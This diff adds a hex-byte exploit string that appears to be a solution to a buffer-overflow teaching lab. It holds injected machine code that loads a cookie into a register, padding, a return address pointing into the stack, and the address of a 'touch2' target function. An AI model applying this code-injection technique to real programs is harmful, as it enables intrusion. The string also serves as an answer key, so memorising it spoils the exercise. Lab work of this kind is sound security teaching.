@@ -1,0 +1,11 @@
+48 c7 c7 bd 0e 56 11 c3 /* cookie to be injected  - 8 bytes */
+30 30 30 30 30 30 30 30 /* padding 48 bytes */
+30 30 30 30 30 30 30 30 /* padding 48 bytes */
+30 30 30 30 30 30 30 30 /* padding 48 bytes */
+30 30 30 30 30 30 30 30 /* padding 48 bytes */
+30 30 30 30 30 30 30 30 /* padding 48 bytes */
+30 30 30 30 30 30 30 30 /* padding 48 bytes */
+f8 e5 61 55 00 00 00 00 /* rsp - 0x38 address of register */
+78 15 40 00 00 00 00 00 /* touch 2 address */
+
+/* total stack is 0x38 or 56 byte long.  */
